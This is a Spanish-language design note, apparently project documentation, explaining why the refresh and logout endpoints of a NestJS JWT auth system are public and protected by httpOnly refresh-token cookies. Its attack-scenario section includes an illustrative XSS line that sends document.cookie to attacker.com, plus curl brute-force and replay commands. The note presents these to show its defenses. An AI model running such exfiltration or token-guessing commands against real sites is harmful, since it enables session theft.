# Análisis de Seguridad: ¿Por qué /auth/refresh y /auth/logout son públicos?

## 🤔 La Pregunta

**Pregunta inicial:** "¿No deberían `/auth/refresh` y `/auth/logout` requerir autenticación?"

**Respuesta corta:** NO. Aquí está el porqué.

---

## 🎯 El Concepto Clave

### Refresh Token ≠ Access Token

| Tipo | Propósito | Duración | Almacenamiento | Revocable |
|------|-----------|----------|----------------|-----------|
| **Access Token** | Autenticar requests API | 30 minutos | Frontend (localStorage) | ❌ No (stateless JWT) |
| **Refresh Token** | Renovar access tokens | 7 días | Backend BD + httpOnly cookie | ✅ Sí (BD) |

**El refresh token ES un mecanismo de autenticación**, no necesita autenticación adicional.

---

## 📊 Análisis por Endpoint

### 1. `/auth/login` - Obvio

```typescript
@Public()
@Post('login')
async login() { ... }
```

**¿Por qué público?**
- ✅ Usuario NO está autenticado todavía
- ✅ Propósito: CREAR autenticación
- ✅ Seguridad: Validación de credenciales (email + password)

**Nadie cuestiona esto.**

---

### 2. `/auth/refresh` - El Confuso

#### ❌ Si fuera protegido con JWT Guard:

```typescript
@UseGuards(JwtAuthGuard) // ← Problema
@Post('refresh')
async refresh() { ... }
```

**Problema fatal:**
```javascript
// Usuario navegando por 35 minutos
// Access token expiró a los 30 minutos

// Frontend intenta renovar:
fetch('/auth/refresh', {
  headers: {
    'Authorization': `Bearer ${expiredToken}` // ← Token EXPIRADO
  }
})

// Backend:
JwtAuthGuard valida token → ❌ EXPIRADO → 401 Unauthorized
// Usuario es deslogueado automáticamente
// NUNCA puede renovar el token
// Debe hacer login de nuevo cada 30 minutos
```

**Resultado:** Sistema de refresh tokens INÚTIL. 🤦‍♂️

#### ✅ Solución correcta:

```typescript
@Public() // No valida JWT porque ya expiró
@Post('refresh')
async refresh(@Request() req) {
  const refreshToken = req.cookies.refreshToken; // ← ESTA es la autenticación

  // Validación real en base de datos
  const tokenDoc = await this.refreshTokenModel.findOne({
    token: refreshToken,
    isRevoked: false
  });

  if (!tokenDoc || tokenDoc.expiresAt < new Date()) {
    throw new UnauthorizedException('Invalid refresh token');
  }

  // Generar nuevo access token
  return { accessToken: this.jwtService.sign(payload) };
}
```

**Seguridad viene de:**
1. ✅ Refresh token en httpOnly cookie (inaccesible para XSS)
2. ✅ Validación en BD (`isRevoked: false`)
3. ✅ Expiración (7 días)
4. ✅ Rate limiting (10 intentos/minuto)

---

### 3. `/auth/logout` - El Práctico

#### Opción A: Protegido con JWT (problemático)

```typescript
@UseGuards(JwtAuthGuard)
@Post('logout')
async logout() { ... }
```

**Problema:**
```javascript
// Usuario se va a dormir 8 horas
// Access token expiró

// Al día siguiente quiere hacer logout:
fetch('/auth/logout', {
  headers: {
    'Authorization': `Bearer ${expiredToken}` // ← Expirado
  }
})

// Backend: 401 Unauthorized
// Usuario NO PUEDE hacer logout
// ¿Solución? Primero refresh, luego logout... 🤦‍♂️
```

#### ✅ Opción B: Público (mejor UX)

```typescript
@Public()
@Post('logout')
async logout(@Request() req, @Res() res) {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    await this.refreshTokenModel.updateOne(
      { token: refreshToken },
      { isRevoked: true }
    );
  }

  res.clearCookie('refreshToken', { path: '/auth' });
}
```

**Ventajas:**
- ✅ Usuario puede hacer logout aunque access token expiró
- ✅ Revoca refresh token en BD
- ✅ Limpia cookie httpOnly
- ✅ Mejor UX

**Seguridad:**
- El refresh token identifica al usuario (no necesita JWT)
- Revocar un token inválido simplemente no hace nada (idempotente)
- El peor caso es que alguien limpie su propia cookie 🤷‍♂️

---

## 🔒 ¿Dónde está la VERDADERA seguridad?

### El error conceptual común:

```
❌ "Si no tiene @UseGuards(JwtAuthGuard), no es seguro"
```

### La realidad:

**Seguridad en capas:**

1. **httpOnly Cookies**
   - JavaScript malicioso NO puede leer `document.cookie`
   - Protección contra XSS attacks

2. **Validación en Base de Datos**
   ```typescript
   const token = await refreshTokenModel.findOne({
     token: refreshToken,
     isRevoked: false, // ← Si admin revocó, falla aquí
     expiresAt: { $gt: new Date() } // ← Si expiró, falla aquí
   });
   ```

3. **Rate Limiting**
   - 10 intentos por minuto máximo
   - Protección contra brute force

4. **SameSite Cookies**
   - Protección contra CSRF attacks

5. **Audit Trail**
   ```typescript
   {
     token: "abc123...",
     userId: ObjectId("..."),
     userAgent: "Chrome 118.0 on MacOS",
     ipAddress: "192.168.1.100",
     createdAt: "2025-10-01T10:00:00Z"
   }
   ```

**JwtAuthGuard es UNA capa de seguridad, NO la única.**

---

## 🎭 Escenarios de Ataque

### Ataque 1: XSS (Cross-Site Scripting)

```javascript
// Script malicioso inyectado:
const stolenToken = document.cookie; // ← httpOnly = NO funciona
fetch('https://attacker.com/steal', {
  body: stolenToken // ← Cookie inaccesible
});
```

**Resultado:** ✅ Protegido (httpOnly cookie)

### Ataque 2: Brute Force en /auth/refresh

```bash
# Atacante intenta adivinar refresh tokens
for i in {1..100}; do
  curl -X POST /auth/refresh \
    --cookie "refreshToken=random_guess_$i"
done
```

**Resultado:**
- ❌ Request #11 rechazado (rate limit: 10/minuto)
- ❌ Tokens aleatorios no existen en BD → 401

### Ataque 3: Token Robado (Man in the Middle)

```bash
# Atacante intercepta refresh token
curl -X POST /auth/refresh \
  --cookie "refreshToken=abc123_stolen"
```

**Defensa:**
```typescript
// Admin revoca desde dashboard:
await refreshTokenModel.updateOne(
  { token: 'abc123_stolen' },
  { isRevoked: true }
);

// Próximo intento del atacante:
// → findOne({ token, isRevoked: false })
// → null (no encuentra porque isRevoked: true)
// → 401 Unauthorized ✅
```

### Ataque 4: Replay Attack

```bash
# Atacante usa token viejo después de logout
curl -X POST /auth/refresh \
  --cookie "refreshToken=abc123_logged_out"
```

**Defensa:**
```typescript
// En logout:
await refreshTokenModel.updateOne(
  { token: 'abc123_logged_out' },
  { isRevoked: true }
);

// Replay attack:
// → findOne({ token, isRevoked: false })
// → null ✅
```

---

## 📝 Comparación de Enfoques

| Aspecto | Con @UseGuards(JwtAuthGuard) | Con @Public() + Cookie Validation |
|---------|------------------------------|-----------------------------------|
| **Refresh después de 30min** | ❌ Falla (token expirado) | ✅ Funciona |
| **Logout después de 30min** | ❌ Falla (token expirado) | ✅ Funciona |
| **Revocación de tokens** | ❌ Imposible (JWT stateless) | ✅ Posible (BD) |
| **Audit trail** | ❌ No hay registro | ✅ Completo en BD |
| **Protección XSS** | ⚠️ Si usa localStorage | ✅ httpOnly cookie |
| **Protección brute force** | ✅ Con rate limiting | ✅ Con rate limiting |
| **UX fluida** | ❌ Re-login cada 30min | ✅ Re-login cada 7 días |

---

## 🏢 Estándar de la Industria

**Todos estos servicios usan el mismo patrón:**

### GitHub
```bash
POST https://github.com/login/oauth/access_token
# Público, valida con refresh token
```

### Google OAuth2
```bash
POST https://oauth2.googleapis.com/token
# Público, valida con refresh token
```

### Auth0
```bash
POST https://YOUR_DOMAIN/oauth/token
# Público, valida con refresh token
```

### AWS Cognito
```bash
POST https://cognito-idp.REGION.amazonaws.com/
# Público, valida con refresh token
```

**Ninguno requiere JWT válido en el endpoint de refresh.**

---

## 💡 Conclusión

### La pregunta correcta NO es:

> "¿Por qué /auth/refresh es público?"

### La pregunta correcta ES:

> "¿Dónde está la validación de seguridad en /auth/refresh?"

**Respuesta:**
1. ✅ httpOnly cookie (transporte seguro)
2. ✅ Validación en BD (isRevoked, expiresAt)
3. ✅ Rate limiting (anti brute force)
4. ✅ Audit trail (userAgent, IP, timestamps)

**El refresh token EN SÍ MISMO es la autenticación.**

No necesita un access token válido porque:
- El access token ya expiró (por eso necesitas refresh)
- El refresh token es más seguro (revocable en BD)
- Es el patrón estándar de OAuth2/OpenID Connect

---

## 📚 Referencias

- [RFC 6749 - OAuth 2.0 (Refresh Tokens)](https://datatracker.ietf.org/doc/html/rfc6749#section-1.5)
- [Auth0: Refresh Token Rotation](https://auth0.com/docs/secure/tokens/refresh-tokens/refresh-token-rotation)
- [OWASP: Token Storage Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)

---

**Fecha:** Octubre 2025
**Versión:** 1.0
